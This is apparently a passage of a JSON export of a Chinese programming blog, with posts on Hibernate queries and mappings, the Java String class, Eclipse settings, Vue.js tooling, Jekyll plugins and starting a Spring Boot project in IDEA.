sessionFactory = HibernateUtils.getSessionFactory();\n\n    // 使用 SessionFactory 创建 session 对象\n    Session session = sessionFactory.openSession();\n\n    // 开启事务\n    Transaction transaction = session.beginTransaction();\n\n    // 添加两个用户，为每个用户添加两个角色\n    // 1.创建对象\n\n    User user1 = new User();\n    User user2 = new User();\n\n    user1.setUserName(\"Tom\");\n    user1.setUserPassword(\"tom123\");\n\n    user2.setUserName(\"Jerry\");\n    user2.setUserPassword(\"jerry123\");\n\n    Role r1 = new Role();\n    r1.setRoleName(\"总经理\");\n\n    Role r2 = new Role();\n    r2.setRoleName(\"秘书\");\n\n    Role r3 = new Role();\n    r3.setRoleName(\"保安\");\n\n    // 2.建立关系，把角色放到用户里面\n    // user1 -- r1/r2\n    // user2 -- r2/r3\n\n    user1.getRoleSet().add(r1);\n    user1.getRoleSet().add(r2);\n    user2.getRoleSet().add(r2);\n    user2.getRoleSet().add(r3);\n\n    // 3.保存用户\n\n    session.save(user1);\n    session.save(user2);\n    \n    // 提交事务\n    transaction.commit();\n\n    // 关闭资源\n    session.close();\n    sessionFactory.close();\n}\n```\n\n#### 多对多的级联删除\n\n第一步，在 set 标签中配置 cascade 值 delete\n\n```xml\n<set name=\"roleSet\" table=\"user_role\" cascade=\"save-update, delete\">\n    ……\n</set>\n```\n\n第二步，删除\n\n```java\nUser user = session.get(User.class, 5);\nsession.delete(user);\n```\n\n#### 维护第三张表\n\n用户和角色多对多关系，维护关系通过第三张表维护\n\n让某个用户有某个角色\n第一步，根据 id 查询用户和角色\n\n第二步，把用户数放到用户里面\n- 把角色对象放到用户 set 集合\n\n```java\nUser user = session.get(User.class, 7);\nRole role = session.get(Role.class, 11);\n\nuser.getRoleSet().add(role);\n```\n\n\n让某个用户没有某个角色\n\n第一步，根据 id 查询用户和角色\n\n第二步，从用户里面把角色去掉\n- 从 set 集合里面把角色移除\n\n```java\nUser user = session.get(User.class, 8);\nRole role = session.get(Role.class, 11);\n\nuser.getRoleSet().remove(role);\n```\n\n\n\n\n","categories":["Hibernate"],"tags":["Java","Hibernate"]},{"title":"Hibernate 原理及实战（四）","url":"/2018/07/2018-07-30-hibernate/","content":"\n### 1.对象导航查询\n\n- 根据 id 查询某个客户，再查询这个客户里面所有的联系人\n\n<!-- more -->\n\n### 2.OID 查询\n\n- 根据 ID 查询某一条记录，返回对象\n\n### 3.hql查询\n\nHQL是Hiberante官方推荐的Hibernate检索方式，它使用类似SQL的查询语言，以面向对象的方式从数据库中查询。可以使用HQL查询具有继承、多态和关联关系的数据。在检索数据时应优先考虑使用HQL方式。\n\n#### 3.0.方法\n\n（1）创建 Query 对象，写HQL语句实现查询\n（2）调用 Query 对象里面的方法得到结果\n\n#### 3.1.查询所有\n\n查询所有的客户的记录\n\n```java\n// 创建 Query 对象\nQuery query = session.createQuery(\"from Customer\");\n// 调用方法得到结果\nList<Customer> list = query.list();\n```\n\n#### 3.2.条件查询\n\n```java\nQuery query = session.createQuery(\"from Customer cid = ? AND customerName = ?\");\n\nquery.setParameter(0,1);\nquery.setParameter(1,\"百度\");\n\nList<Customer> list = query.list();\n```\n\n#### 3.3.排序查询\n\n```java\nQuery query = session.createQuery(\"from Customer order by cid asc\"); \n// asc 升序 desc 降序\nList<Customer> list = query.list();\n```\n\n#### 3.4.分页查询\n\n\n```java\n// 分页\nQuery query = session.createQuery(\"from Customer\");\n\nquery.setFirstResult(0);\nquery.setMaxResults(3);\n\nList<Customer> list = query.list();\n```\n\n#### 3.5.投影查询\n\n```java\nQuery query = session.createQuery(\"select customerName from Customer\");\nList<Object> list = query.list();\n```\n\n#### 3.6.聚合查询\n\ncount sum avg max min\n\n```java\nQuery query = session.createQuery(\"select count(*) from Customer\");\nObject obj = query.uniqueResult();\nLong lobj = (Long) obj;\nint count = lobj.intValue();\n```\n\n### 4.QBC查询\n\n（1）使用 HQL 查询的时候需要写 HQL 语句，使用 QBC 的时候用方法来实现。\n（2）使用 QBC 的时候，操作实体类和属性。\n（3）调用 Criteria 对象里面的方法得到结果\n\n#### 4.1.查询所有\n\n```java\n// 创建 criteria 对象\nCriteria criteria = session.createCriteria(Customer.class);\nList<Customer> list = criteria.list();\nfor(Customer customer : list) {\n    System.out.println(customer.getCid() + customer.getCustomerName());\n}\n```\n\n#### 4.2.条件查询\n\n使用封装的方法\n\n```java\nCriteria criteria = session.createCriteria(Customer.class);\ncriteria.add(Restrictions.eq(\"cid\", 1));\ncriteria.add(Restrictions.eq(\"customerName\", \"百度\"));\n// criteria.add(Restrictions.like(\"customerName\", \"%百%\"));\nList<Customer> list = criteria.list();\n```\n\n#### 4.3.排序查询\n\n\n```java\nCriteria criteria = session.createCriteria(Customer.class);\ncriteria.add(Order.desc(\"cid\"));\nList<Customer> list = criteria.list();\n```\n\n#### 4.4.分页查询\n\n\n```java\nCriteria criteria = session.createCriteria(Customer.class);\ncriteria.setFirstResult(0);\ncriteria.setMaxResults(3);\nList<Customer> list = criteria.list();\n```\n\n#### 4.5.统计查询\n\n\n```java\nCriteria criteria = session.createCriteria(Customer.class);\ncriteria.setProject(Projections.rowCount());\nObject obj = criteria.uniqueResult();\nLong lobj = (Long) obj;\nint count = lobj.intValue();\n```\n\n\n#### 4.6.离线查询\n\n离线场景：在 servlet 中拼接查询条件，传到 dao 中\n\n```java\n// 创建对象\nDetachedCriteria detachedCriteria = DetachedCriteria.forClass(Customer.class);\n\n// 最终执行的时候再需要用到 session\nCriteria criteria = detachedCriteria.getExecutableCriteria(session);\n\nList<Customer> list = criteria.list();\n```\n\n### 5.HQL 多表查询\n\n#### 5.1.内连接\n\n返回的是数组\n\nfrom Customer c inner join c.linkManSet\n\n```java\nQuery query = session.createQuery(\"from Customer c inner join c.linkManSet\");\nList<Object> list = query.list();\n```\n\n#### 5.2.左外连接\n\nfrom Customer c left outer join c.linkManSet\n\n```java\nQuery query = session.createQuery(\"from Customer c left outer join c.linkManSet\");\nList<Object> list = query.list();\n```\n\n#### 5.3.右外连接\n\nfrom Customer c right outer join c.linkManSet\n\n```java\nQuery query = session.createQuery(\"from Customer c right outer join c.linkManSet \");\nList<Object> list = query.list();\n```\n\n#### 5.4.迫切内连接\n\n返回的是对象\n\nfrom Customer c inner join fetch c.linkManSet\n\n```java\nQuery query = session.createQuery(\"from Customer c inner join fetch c.linkManSet\");\nList<Object> list = query.list();\n```\n\n#### 5.5.迫切左外连接\n\n返回的是对象\n\nfrom Customer c left outer join fetch c.linkManSet\n\n```java\nQuery query = session.createQuery(\"from Customer c left outer join fetch c.linkManSet\");\nList<Object> list = query.list();\n```\n\n\n### 6.Hibernate 检索策略\n\n1.Hibernate 检索策略分为两类\n- （1）立即查询，根据 id 进行查询，调用 get 方法，一调用 get 方法马上发送语句查询数据库\n- （2）延迟查询，根据 id 进行查询，调用 load 方法，调用 load 方法不会马上发送语句查询数据，只有得到对象里面的值的时候才会发出语句查询数据库。\n\n2.延迟查询分为两类\n- （1）类级别延迟，根据 id 查询返回实体类对象，调用 load 方法不会马上发送语句\n- （2）关联级别延迟\n    - 查询某个客户，再根据客户查询这个客户所有联系人，查询客户所有联系人的过程是否需要延迟，这个过程称为关联级别的延迟","categories":["Hibernate"],"tags":["Java","Hibernate"]},{"title":"String 类详解","url":"/2018/08/2018-08-29-java-string/","content":"\n### String 类详解\n\n- String 类对象是不可变的，字符串一旦创建，内容不能再变\n\n<!-- more -->\n\n#### String 类到底是什么\n\n看下面的代码，可以看出 String 类就是一个字符数组，并且是 final 类型的。所以自然是不可变的。\n\n```java\npublic final class String\n    implements java.io.Serializable, Comparable<String>, CharSequence {\n    /** The value is used for character storage. */\n    private final char value[];\n    \n    public String concat(String str) {\n        int otherLen = str.length();\n        if (otherLen == 0) {\n            return this;\n        }\n        int len = value.length;\n        char buf[] = Arrays.copyOf(value, len + otherLen);\n        str.getChars(buf, len);\n        return new String(buf, true);\n    }\n}\n```\n\n但是为什么我们可以执行下面的操作呢？\n\n```java\nString str = \"hello\";\nstr += \" world\";\nSystem.out.println(str);\n// hello world\n```\n\n表面上看 str 确实变了啊\n\n但实际上呢？`str += \" world\";` 到底发生了什么？\n\n实际上是执行了 concat() 方法， str += \" world\";   =>  str.concat(\" world\");\n\n```java\nString str = \"hello\";\nstr.concat(\" world\");\nSystem.out.println(str);\n// hello\n```\n\n咦，为什么没有变\n\n我们看上面 String 类中的 concat() 方法，仔细观察发现，他的返回值才是我们要的新字符串。\n\n```java\nString str = \"hello\";\nstr = str.concat(\" world\");\nSystem.out.println(str);\n// hello world\n```\n\n由此看来 String 类的对象确实没有变，在执行 `str += \" world\";`  实际上是执行了 `str = str.concat(\" world\");` 新的字符串地址被赋给了 str。\n\n#### Java 中为了效率考虑\n\n- 以 \"\" 包括的字符串，只要内容相同\n  - 顺序、大小写相同\n- 无论在程序代码中出现几次，JVM 都只会建立一个实例\n- 放在字符串池（String Pool）中维护\n\n\n\n#### 使用不同方式创建字符串\n\n如下图所示，\n\nname1 和 name2 是相等的，因为 name1 和 name2 都是指向字符串池的一个字符串。\n\nname3 和 name4 是不相等的，因为有了 new 关键字，new 是什么呢？new 是动态分配内存，因此 name3 和 name4 是在内存里的两个字符串，自然指向的地址是不同的。\n\n\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-17-18-sRnvsp-RINwDc.jpg)\n\n\n\n#### 在 Java 中 String 是引用类型\n\n- String 是 Java 库中预定义的类：java.lang.String\n- String 对象有很多构造方法，这里列举几个常用的构造方法。\n\n| 构造器                                         | 说明                                 | 示例                                                         |\n| ---------------------------------------------- | ------------------------------------ | ------------------------------------------------------------ |\n| String()                                       | 创建一个空字符串对象                 | String str = new String();                                   |\n| String(String original)                        | 用字符串直接创建新字符串对象         | String str = new String(\"hello\");                            |\n| String(char value[])                           | 用字符数组创建一个字符串             | char[] charArray = {'h', 'e', 'l', 'l', 'o'};<br />String str = new String(charArray); |\n| String(byte bytes[])                           | 用字节数组创建一个字符串             | byte[] byteArray = {104, 101, 108, 108, 111};<br />String str = new String(byteArray); |\n| String(byte bytes[], <br />String charsetName) | 用字节数组和指定字符集创建一个字符串 | String str = <br />new String(str.getBytes(\"gbk\"), \"gb2312\"); |\n\n#### 字符串常用方法\n\n| 方法                       | 说明                                                         |\n| -------------------------- | ------------------------------------------------------------ |\n| length()                   | 获取字符串中的字符个数                                       |\n| charAt(index)              | 返回字符串中指定下标的字符                                   |\n| concat(str)                | 拼接字符串，返回一个**新**字符串对象                         |\n| toUpperCase()              | 返回一个**新**字符串，所有字母大写                           |\n| toLowerCase()              | 返回一个**新**字符串，所有字母小写                           |\n| trim()                     | 返回一个**新**字符串，去掉两边空格                           |\n| char[] toCharArray()       | 将此字符串转换为一个**新**的字符数组                         |\n| equals(str)                | 逐字符比较，相等返回 true，不相等返回 false                  |\n| equalsIgnoewCase(str)      | 忽略大小写比较                                               |\n| compareTo(str)             | 根据比较大小分别返回小于0，0，大于0的整数                    |\n| compareToIgnoreCase(str)   | 忽略大小写比较                                               |\n| startsWith(prefix)         | 如果字符以特定前缀开始，返回 true                            |\n| endsWith(suffix)           | 如果字符以特定后缀结束，返回 true                            |\n| contains(str)              | 如果 str 是字符串的子字符串，返回 true                       |\n| indexOf(ch)                | 返回字符串中出现的第一个字符 ch 下标，没有匹配返回 -1        |\n| indexOf(ch, fromIndex)     | 返回字符串中 fromIndex 之后出现的第一个 ch 下标，无匹配返回 -1 |\n| indexOf(s)                 | 返回字符串中出现的第一个字符串 s 的下标，无匹配返回 -1       |\n| indexOf(s, fromIndex)      | 返回字符串中 fromIndex 之后出现的第一个字符串 s 的下标，无匹配返回 -1 |\n| lastIndexOf(ch)            | 返回字符串中出现的最后一个字符 ch 下标，没有匹配返回 -1      |\n| lastIndexOf(ch, fromIndex) | 返回字符串中 fromIndex 之前出现的最后一个字符 ch 下标，没有匹配返回 -1 |\n| lastIndexOf(s)             | 返回字符串中出现的最后一个字符串 s 下标，没有匹配返回 -1     |\n| lastIndexOf(s, fromIndex)  | 返回字符串中 fromIndex 之前出现的最后一个字符串 s 下标，没有匹配返回 -1 |\n| substring(begin)           | 返回该字符串的子字符串，从 begin 下标到字符串的结尾          |\n| substring(begin, end)      | 返回该字符串的子字符串，从 begin 下标到 end-1 下标之间（左闭右开） |\n\n\n\n#### 增强版的字符串 StringBuffer、StringBuilder\n\n我们再来重新看这个例子\n\n```java\nString str1 = \"a\";\nString str2 = \"b\";\nString str3 = str1 + str2;\n```\n\n之前说过是 concat() 方法实现的，但是 concat() 效率太低了，实际上呢是这样的底层实现\n\n```java\nString str3 = new StringBuffer(String.valueOf(str1)).append(str2).toString;\n```\n\n对比一下效率\n\n```java\npublic class StringDemo {\n\n    private static long startTime, endTime;\n\n    public static void main(String[] args) {\n\n        final int N = 100000;\n\n        startTime = System.currentTimeMillis();\n        String str = \"\";\n        for (int i = 0; i < N; i++) {\n            str += \"*\";\n        }\n        endTime = System.currentTimeMillis();\n        System.out.println(endTime - startTime + \"毫秒\");\n\n        startTime = System.currentTimeMillis();\n        StringBuffer stringBuffer = new StringBuffer(\"\");\n        for (int i = 0; i < N; i++) {\n            stringBuffer.append(\"*\");\n        }\n        endTime = System.currentTimeMillis();\n        System.out.println(endTime - startTime + \"毫秒\");\n    }\n}\n\n// N = 100000\n// 5324毫秒\n// 2毫秒\n// N = 500000\n// 49577毫秒\n// 9毫秒\n```\n\n####StringBuffer、StringBuilder\n\nStringBuffer、StringBuilder 用法上几乎是相同的。\n\n- 与 String 类不同的是，StringBuffer 和 StringBuilder 类的对象能够被多次的修改，并且不产生新的未使用对象。\n- StringBuilder 类在 Java 5 中被提出，它和 StringBuffer 之间的最大不同在于 StringBuilder 的方法不是线程安全的（不能同步访问）。\n\n| 构造方法                   | 说明                                     |\n| -------------------------- | ---------------------------------------- |\n| StringBuffer()             | 构建一个默认缓存为16的 StringBuffer 对象 |\n| StringBuffer(int capacity) | 构建一个指定缓存容量的 StringBuffer 对象 |\n| StringBuffer(String str)   | 构建一个指定字符串值的 StringBuffer 对象 |","categories":["Java"],"tags":["Java","String"]},{"title":"The compiler compliance specified is 1.5 but a JRE 1.8 is used","url":"/2018/10/2018-10-23-The%20compiler%20compliance%20specified%20is%201.5%20but%20a%20JRE%201.8%20is%20used/","content":"\n### 问题：\n\nThe compiler compliance specified is 1.5 but a JRE 1.8 is used\n\n<!-- more -->\n\n### 情景再现：\n\nEclipse 在编译执行程序的时候，可能会出现这样的 warning，如图所示\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-17-20-Screen%20Shot%202018-10-24%20at%2012.18.45%20AM-atS527.png)\n\n### 原因：\n\nCompiler compliance level 的含义说明：设置编译级别，既 Eclipse 中设置 Compiler compliance level为较低版本，只是让编译器相信你的代码是兼容较低版本的，在编译时生成的bytecode(class)兼容较低版本。\n\n这样设置与你写代码时引用的 JDK 是没关系的，也就是说你在写代码时仍可以引用较高版本的 API.（这样就可能导致错误）设置 Compiler compliance level 为较低版本，这样的好处是当别人使用了较低版本的 JDK 时也可以引用你写的编译后的代码。它可以保证编译后的 class 文件的版本一致性。但是，如果你的代码里面(java source)里面调用了较高版本 JDK 的 API.那么即使设置了 Compiler compliance level 为较低版本，在较低版本的 JDK 上运行你的代码也会报错。所以建议在写代码时引用的 JDK，要跟你 Compiler compliance level设置的版本，要求是一致的。\n\n### 解决：\n\n项目上右键 -> Properties -> Java Compiler -> Compiler compliance level\n\n将这一项改为 1.8 (你对应的版本)，保存或者应用就可以了。\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-17-21-Screen%20Shot%202018-10-24%20at%2012.22.48%20AM-a9P4VC.png)\n\n","tags":["eclipse","compiler","jre","jdk"]},{"title":"Sublime Text 3 的一些使用技巧","url":"/2018/10/2018-10-26-sublime/","content":"\n### project\n\nproject 可以实现一个工作区内添加多个文件夹，这样就可以查看和修改文件更加的方便 \n\n<!-- more -->\n\n方法：\n\n```\nProject -> Sava Project As... \n```\n\n```\nProject -> Add Folder to Project...\n```\n\n还有切换 Project 的快捷键 ^⌘P\n\n下面这张图是 project 文件的内容，实际上就是存储了项目中包含文件夹的目录。\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-17-25-Screen%20Shot%202018-10-26%20at%209.44.01%20AM-qHYsTU.png)","tags":["sublime","sublime text"]},{"title":"Vue.js 初学者可能会遇到的问题","url":"/2018/10/2018-10-26-vue-js-start/","content":"\n### 1. npm 和 Yarn\n\nYarn [https://yarnpkg.com/zh-Hans/](https://yarnpkg.com/zh-Hans/)\n\nnpm [https://www.npmjs.com/](https://www.npmjs.com/)\n\n<!-- more -->\n\n\nnpm 和 Yarn 都是 JavaScript 的管理工具，但是 Yarn 会比 npm 快的多，Yarn 会缓存它下载的每个包，所以无需重复下载。它还能并行化操作以最大化资源利用率，安装速度之快前所未有。\n\n### 2. npm 和 cnpm \n\nnpm 的仓库在国外，国内用户访问会慢很多，甚至有时候影响了项目的构建。\n\n因此出现了 cnpm 淘宝的 npm 镜像 [https://npm.taobao.org/](https://npm.taobao.org/)\n\n可以使用淘宝定制的 cnpm (gzip 压缩支持) 命令行工具代替默认的 npm:\n\n\n```shell\n$ npm install -g cnpm --registry=https://registry.npm.taobao.org\n```\n\n安装完之后就可以使用 cnpm 命令了，详细的使用方法还是看官方的说明吧 [https://npm.taobao.org/](https://npm.taobao.org/)\n\n\n### 3. eslint - JavaScript 代码规范\n\n刚开始 init Vue.js 的项目时，有关于 JavaScript 语法检查的 eslint 的选项，如果我们开了之后，会发现运行的时候可能有很多错误，但是不知道错在哪里，其实有可能不是错误，只是不符合规范。\n\n我们可以从下面两个链接中学习一下关于 JavaScript 的规范，这个规范只是大家约定俗成的的一套规范，能够让我们开发出更加优秀的代码。虽然看着比较艰难，有些规范也有很多人争论，但这并不是我们的重点，我们的重点在如何高效率的开发出程序来。\n\n\n[https://github.com/standard/standard/blob/master/docs/README-zhcn.md](https://github.com/standard/standard/blob/master/docs/README-zhcn.md)\n\n[https://github.com/standard/standard/blob/master/docs/RULES-zhcn.md](https://github.com/standard/standard/blob/master/docs/RULES-zhcn.md)\n\n### 4. Yarn CLI 介绍\n\n[https://yarnpkg.com/zh-Hans/docs/cli/](https://yarnpkg.com/zh-Hans/docs/cli/)\n\n### Vuetify - Material Design Component Framework\n\nhttps://vuetifyjs.com/\n\n### 5. vue-2-boilerplate - 一个 Vue.js 的脚手架\n\nVue 2 boilerplate for developing medium to large single page applications.\n\n[https://github.com/petervmeijgaard/vue-2-boilerplate](https://github.com/petervmeijgaard/vue-2-boilerplate)\n\n### 6. Vue CLI 3\n\n现在 Vue CLI 的版本号是 3.X.X，有关于他的用法的说明在官网上 [https://cli.vuejs.org/](https://cli.vuejs.org/) \n\n官网上面是这样描述 Vue CLI 3 的\n\n> Standard Tooling for Vue.js Development.\n\n> Vue.js 开发的标准工具\n\nVue CLI 3 的安装的方式是\n\n```shell\nnpm install -g @vue/cli\n# OR\nyarn global add @vue/cli\n```\n\n创建一个项目：\n\n```shell\nvue create my-project\n# OR 使用 web 管理界面管理 Vue.js 的项目\nvue ui\n```\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-17-26-ui-new-project-NTLfxv.png)\n\nCLI 服务 (@vue/cli-service) 是一个开发环境依赖。它是一个 npm 包，局部安装在每个 @vue/cli 创建的项目中。\n\nCLI 服务是构建于 webpack 和 webpack-dev-server 之上的。它包含了：\n\n加载其它 CLI 插件的核心服务；\n一个针对绝大部分应用优化过的内部的 webpack 配置；\n项目内部的 vue-cli-service 命令，提供 serve、build 和 inspect 命令。\n\n\n而之前的 Vue CLI 2 的安装方式却是不同的，因此网上的教程会让你眼花缭乱，不知所措，如果有特定需求需要安装低版本的话，按照下面的方式安装\n\n```shell\nnpm install -g vue-cli\n```\n\n创建一个项目\n\n```shell\nvue init webpack my-project\n```\n\n### 7. vue-router \n\n\nVue Router 是 Vue.js 官方的路由管理器。它和 Vue.js 的核心深度集成，让构建单页面应用变得易如反掌。\n\n用法\n\n```js\nimport Vue from 'vue'\nimport Router from 'vue-router'\nimport Home from './views/Home.vue'\n\nVue.use(Router)\n\nexport default new Router({\n  routes: [\n    {\n      path: '/',\n      name: 'home',\n      component: Home\n    },\n    {\n      path: '/about',\n      name: 'about',\n      // route level code-splitting\n      // this generates a separate chunk (about.[hash].js) for this route\n      // which is lazy-loaded when the route is visited.\n      component: () => import(/* webpackChunkName: \"about\" */ './views/About.vue')\n    }\n  ]\n})\n```\n\nApp.vue 中这样写\n\n\n```vue\n<template>\n  <router-view/>\n</template>\n```\n\n\n### 参考文献\n\n- [知乎 - npm和yarn的区别，我们该如何选择？](https://zhuanlan.zhihu.com/p/27449990)\n\n","categories":["Vue.js"],"tags":["vue.js","vue","beginner","npm","yarn","vue-cli"]},{"title":"Jekyll 中代码块显示 Liquid 代码","url":"/2018/10/2018-10-27-jekyll-liquid-code/","content":"\n在写关于 Jekyll 模板的文章的时候发现 Liquid 代码无法在文章中正确显示\n\n<!-- more -->\n\n这个时候可以这样写\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-17-34-Screen%20Shot%202018-10-27%20at%209.44.18%20PM-g8kVtP.png)\n\n这样就能显示出来啦~~~\n\n\n```html\n{% raw %}\n\n<!-- This loops through the paginated posts -->\n{% for post in paginator.posts %}\n  <h1><a href=\"{{ post.url }}\">{{ post.title }}</a></h1>\n  <p class=\"author\">\n    <span class=\"date\">{{ post.date | date_to_rfc822 }}</span>\n  </p>\n  <div class=\"content\">\n    {{ post.content | strip_html |truncate:210,'...' }}\n  </div>\n  <br>\n{% endfor %}\n\n{% endraw %}\n```\n","categories":["Jekyll"],"tags":["Jekyll","Liquid"]},{"title":"Jekyll 分页","url":"/2018/10/2018-10-27-jekyll-paginate/","content":"\n\n### 修改 `Gemfile` 文件，在文件末尾追加\n\n```\ngem \"jekyll-paginate\"\n```\n\n<!-- more -->\n\n如果没有追加这一句的话就会出现下面的报错\n\n\n> Dependency Error: Yikes! It looks like you don't have jekyll-paginate or one of its dependencies installed. In order to use Jekyll as currently configured, you'll need to install this gem. The full error message from Ruby is: 'cannot load such file -- jekyll-paginate' If you run into trouble, you can find helpful resources at https://jekyllrb.com/help/! \n\n\n### 修改 `_config.yml` 文件\n\n这个很好理解，就是在 yml 文件中添加这个插件，并且规定每页的数量和每页的链接\n\n```yml\nplugins:\n  - jekyll-paginate\n\npaginate: 10\npaginate_path: \"blog/page:num\"\n```\n\n### 修改 `index.html` 文件\n\n```html\n{% raw %}\n---\n# You don't need to edit this file, it's empty on purpose.\n# Edit theme's home layout instead if you wanna make some changes\n# See: https://jekyllrb.com/docs/themes/#overriding-theme-defaults\nlayout: default\t\npagination: \n  enabled: true\n---\n\n<!-- This loops through the paginated posts -->\n{% for post in paginator.posts %}\n  <h1><a href=\"{{ post.url }}\">{{ post.title }}</a></h1>\n  <p class=\"author\">\n    <span class=\"date\">{{ post.date | date_to_rfc822 }}</span>\n  </p>\n  <div class=\"content\">\n    {{ post.content | strip_html |truncate:210,'...' }}\n  </div>\n  <br>\n{% endfor %}\n\n<br><hr><br>\n\n<!-- Pagination links -->\n<div class=\"pagination\">\n  {% if paginator.previous_page %}\n    <a href=\"{{ paginator.previous_page_path }}\" class=\"previous\">\n      Previous\n    </a>\n  {% else %}\n    <span class=\"previous\">Previous</span>\n  {% endif %}\n  <span class=\"page_number \">\n    Page: {{ paginator.page }} of {{ paginator.total_pages }}\n  </span>\n  {% if paginator.next_page %}\n    <a href=\"{{ paginator.next_page_path }}\" class=\"next\">Next</a>\n  {% else %}\n    <span class=\"next \">Next</span>\n  {% endif %}\n</div>\n{% endraw %}\n```\n\n### 在本地运行\n\n如果想在本地运行的话，就要执行下面这条命令来安装依赖包\n\n```shell\ngem install jekyll-paginate\n```\n或者\n\n```shell\nbundle install\n```\n\n如果不执行的话就会出现下面的报错\n\n\n```\nCould not find jekyll-paginate-1.1.0 in any of the sources\nRun `bundle install` to install missing gems.\n```\n\n","categories":["Jekyll"],"tags":["Jekyll","paginate","分页"]},{"title":"Jekyll 搜索引擎优化之 sitemap","url":"/2018/10/2018-10-27-jekyll-sitemap/","content":"\n### 什么是 sitemap\n\n> Sitemap 可方便网站管理员通知搜索引擎他们网站上有哪些可供抓取的网页。最简单的 Sitemap 形式，就是XML 文件，在其中列出网站中的网址以及关于每个网址的其他元数据（上次更新的时间、更改的频率以及相对于网站上其他网址的重要程度为何等），以便搜索引擎可以更加智能地抓取网站。 ——[百度百科](https://baike.baidu.com/item/sitemap)\n\n<!-- more -->\n\n### Jekyll-sitemap 插件\n\n[https://github.com/jekyll/jekyll-sitemap](https://github.com/jekyll/jekyll-sitemap)\n\n> Jekyll plugin to silently generate a sitemaps.org compliant sitemap for your Jekyll site\n\n### 安装方法 \n\n与之前说过的[为 Jekyll 添加分页功能](https://notes.0xl2oot.cn/jekyll/2018/10/27/jekyll-paginate.html)类似，在网站的 `Gemfile`文件中添加下面的语句\n\n```\ngem \"jekyll-sitemap\"\n```\n\n修改 `_config.yml` 文件\n\n```yml\nurl: \"http://example.com\" # the base hostname & protocol for your site\nplugins:\n  - jekyll-sitemap\n```\n\n更多用法参见 GitHub [https://github.com/jekyll/jekyll-sitemap](https://github.com/jekyll/jekyll-sitemap)\n\n### 在本地运行\n\n如果想在本地运行的话，就要执行下面这条命令来安装依赖包\n\n```shell\ngem install jekyll-sitemap\n```\n\n或者\n\n```shell\nbundle install\n```\n\n如果不执行的话就会出现下面的报错\n\n\n```\nCould not find jekyll-sitemap in any of the sources\nRun `bundle install` to install missing gems.\n```\n","categories":["Jekyll"],"tags":["Jekyll","sitemap","搜索"]},{"title":"使用 Simple-Jekyll-Search 搜索你的文章","url":"/2018/10/2018-10-27-use-simple-jekyll-search-on-your-blog-in-these-easy-steps/","content":"\n# Requirements\n\n- a Jekyll blog (of course)\n\n<!-- more -->\n\n# Create search.json\n\nCreate a file `search.json` with this content:\n\n```\n{% raw  %}\n---\nlayout: nil\n---\n[\n  {% for post in site.posts %}\n    {\n      \"title\"    : \"{{ post.title | escape }}\",\n      \"category\" : \"{{ post.category }}\",\n      \"tags\"     : \"{{ post.tags | join: ', ' }}\",\n      \"url\"      : \"{{ site.baseurl }}{{ post.url }}\",\n      \"date\"     : \"{{ post.date }}\"\n    } {% unless forloop.last %},{% endunless %}\n  {% endfor %}\n]\n{% endraw  %}\n```\n\n# Prepare HTML\n\nIn your template add the following markup to define a placeholder for the search widget:\n\n```\n<input type=\"text\" id=\"search-input\" placeholder=\"search posts..\">\n<br/>\n<div id=\"results-container\"></div>\n```\n\n# Initialize search widget\n\nAdd the following script tag to your base/default `_layout`:\n\n```\n<script src=\"https://unpkg.com/simple-jekyll-search@1.5.0/dest/simple-jekyll-search.min.js\"></script>\n```\n\nAnd in a separate script tag:\n\n```\n<script>\nSimpleJekyllSearch({\n  search-input: document.getElementById('search-input'),\n  resultsContainer: document.getElementById('results-container'),\n  json: '/search.json',\n  searchResultTemplate: '<li><a href=\"{% raw %}{{ site.url }}{% endraw %}{url}\">{title}</a></li>'\n})\n</script>\n```\n\n---\n\nThat's all!\n\n### 参考资料\n\n- [https://github.com/christian-fei/Simple-Jekyll-Search](https://github.com/christian-fei/Simple-Jekyll-Search)","categories":["Jekyll"],"tags":["Jekyll","搜索","search"]},{"title":"使用 IDEA 创建一个简单的 Java Web 项目","url":"/2018/10/2018-10-28-springboot-start-a-web-project/","content":"\nJust follow me!\n\n打开 IDEA -> Create New Project -> Spring Initializr\n\n<!-- more -->\n\nChoose Initializr Service Url 选择默认即可\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-17-35-Screen%20Shot%202018-10-28%20at%204.23.26%20PM-Tz21SX.png)\n\n填写 Group 和 Artifact，这一页中的内容是 Maven 项目的参数，关于这个可以参考 [知乎 -- Maven中的参数分别是什么意思？](https://www.zhihu.com/question/24494667)\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-17-35-Screen%20Shot%202018-10-28%20at%204.23.40%20PM-KKi31n.png)\n\n接下来我们看到了很多 Web 的组件，我们只勾选一个 Web 里的 Web 选项。\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-17-35-Screen%20Shot%202018-10-28%20at%204.23.48%20PM-yCFawm.png)\n\n接下来选择项目文件的存储位置，选完之后就可以进入项目了。\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-17-35-Screen%20Shot%202018-10-28%20at%204.24.14%20PM-qshVZC.png)\n\n进入项目之后可能需要等一段时间，让 IDEA 帮我们下载好所需的文件。\n\n接下来我们看一下项目的目录结构：\n- .idea 文件夹内是 IDEA 自动生成的关于 IDEA 的一些配置，我们不需要管\n- .mvn 文件夹是 Maven 帮我们生成的文件\n- src 目录是我们主要关注的目录，和一般的 Java 项目一样，都有包和 .java 文件，main 目录是主要的程序目录，test 是用来写测试用例的。resources 目录存放一些静态的资源文件。\n- .gitignore 文件是 git 生成的用来忽略指定文件变化的\n- mvnw 和 mvnw.cmd 分别是 Linux/macOS 和 Windows 的 Maven 脚本\n- pom.xml 是 Maven 项目的配置文件，我们如果需要什么组件都可以在这里进行配置。\n\n![](https://up-img.yonghong.tech/pic/2021/07/29-17-35-Screen%20Shot%202018-10-28%20at%204.38.16%20PM-vutqfV.png)\n\n看过配置之后我们来运行一下这个简单的 Java Web 项目\n\n项目的入口文件是 main 目录下的 java 目录下的 com.example.demo 包的 DemoApplication.java 的 main() 方法。右键 Run 'DemoApplication'\n\n可以看到控制台中出现了很多日志。如果我们看到下面的这句，说明我们运行成功了，那么怎么查看呢，在浏览器中\n输入 [http://localhost:8080/](http://localhost:8080/)\n\nTomcat started on port(s): 8080 (http) with context path 